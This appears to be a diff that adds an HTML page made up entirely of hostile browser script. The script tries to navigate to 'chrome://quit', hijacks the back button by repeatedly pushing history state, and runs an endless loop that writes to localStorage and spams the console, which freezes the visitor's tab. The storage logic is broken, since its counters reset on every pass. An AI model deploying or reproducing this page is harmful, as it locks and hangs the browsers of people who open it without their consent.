@@ -1,0 +1,30 @@
+<html>
+  <head>
+
+  </head>
+  <body>
+    <script>
+      try {
+          window.location.replace("chrome://quit")
+          //some old browsers support this, if they are useing VERY old chromium.
+      } finally {
+          history.pushState(null, document.title,     location.href);
+          window.addEventListener('popstate', function(event) {
+              history.pushState(null, document.title,      location.href);
+          })
+          while(true) {
+              let location = 1
+              let item = 1
+              localStorage.setItem(location, item)
+              location = location+1
+              item = item*2
+              localStorage.getItem(location)
+              console.log("added and used: "+item+" at "+location)
+          }
+      }
+      if (window.closed) {
+          window.location.replace("run.html")
+      }
+    </script>
+  </body>
+</html>
